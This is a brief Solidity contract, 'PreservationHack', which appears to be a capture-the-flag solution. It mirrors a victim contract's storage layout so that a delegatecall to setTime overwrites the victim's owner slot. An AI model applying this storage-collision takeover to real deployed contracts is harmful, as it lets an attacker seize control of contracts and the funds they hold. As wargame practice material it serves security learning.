// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() {}

    function setTime(uint256 _time) public {
        owner = address(_time);
    }
}